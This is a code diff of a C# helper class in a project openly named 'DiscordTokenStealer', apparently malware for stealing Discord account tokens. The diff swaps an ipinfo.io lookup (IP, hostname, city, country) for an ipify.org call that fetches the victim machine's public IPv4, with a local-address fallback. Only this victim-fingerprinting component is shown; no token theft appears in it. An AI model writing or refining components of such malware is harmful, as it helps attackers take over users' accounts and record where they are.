@@ -1,18 +1,16 @@
 ﻿using System.Net;
-using System.Text.Json;
 using System.Net.Sockets;
-using System.Text.Json.Serialization;
+using System.Net.NetworkInformation;
 
 namespace DiscordTokenStealer;
 
 public static class IPInfo
 {
-    private static async Task<IPInformation?> GetIpInformation()
+    private static async Task<IPAddress> GetPublicIPv4()
     {
-        using HttpClient client = new(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true);
-        using HttpResponseMessage response = await client.GetAsync(new Uri("https://ipinfo.io/"));
-        await using Stream json = await response.Content.ReadAsStreamAsync();
-        return await JsonSerializer.DeserializeAsync<IPInformation>(json);
+        using HttpClient client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true);
+        using HttpResponseMessage response = await client.GetAsync(new Uri("https://api.ipify.org"));
+        return IPAddress.Parse(await response.Content.ReadAsStringAsync());
     }
 
     private static async Task<IPAddress> GetLocalIPv4()
@@ -21,26 +19,12 @@ public static class IPInfo
             address.AddressFamily == AddressFamily.InterNetwork);
     }
 
-    public static async Task<IPAddress> GetAddress(bool preferlocal = false)
+    public static async Task<IPAddress> GetAddress()
     {
-        IPAddress local = await GetLocalIPv4();
-        if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
+        if (!NetworkInterface.GetIsNetworkAvailable())
         {
-            return local;
+            return await GetLocalIPv4();
         }
-        IPInformation? info = await GetIpInformation();
-        if (info == null || !IPAddress.TryParse(info.IP, out IPAddress? address))
-        {
-            return local;
-        }
-        return preferlocal ? local : address;
-    }
-
-    private class IPInformation
-    {
-        [JsonPropertyName("ip")] public string IP { get; set; }
-        [JsonPropertyName("hostname")] public string Hostname { get; set; }
-        [JsonPropertyName("city")] public string City { get; set; }
-        [JsonPropertyName("country")] public string Country { get; set; }
+        return await GetPublicIPv4();
     }
 }
